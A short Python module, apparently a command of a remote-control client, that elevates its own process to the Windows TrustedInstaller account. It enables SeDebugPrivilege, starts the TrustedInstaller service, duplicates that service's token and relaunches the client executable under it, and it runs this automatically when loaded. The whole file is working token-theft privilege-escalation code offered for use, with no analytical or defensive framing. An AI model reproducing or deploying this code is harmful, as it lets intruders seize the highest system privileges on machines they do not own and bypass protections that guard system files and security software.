from client.commands.platform.utils.win_util import enable_privilege, get_pid, duplicate_token, \
    create_process_with_token, get_process_token, start_service
from core.utils.client_util import get_executable_path


def run_as_trusted_installer():
    enable_privilege('SeDebugPrivilege')
    start_service('TrustedInstaller')
    pid = get_pid('TrustedInstaller.exe')
    if not pid:
        print('TrustedInstaller.exe not found')
        return
    h_token = duplicate_token(get_process_token(pid))
    pid = create_process_with_token(h_token, "C:\\windows\system32\cmd.exe", "/c " + get_executable_path())
    print(f'Process created as TrustedInstaller: {pid}')


run_as_trusted_installer()
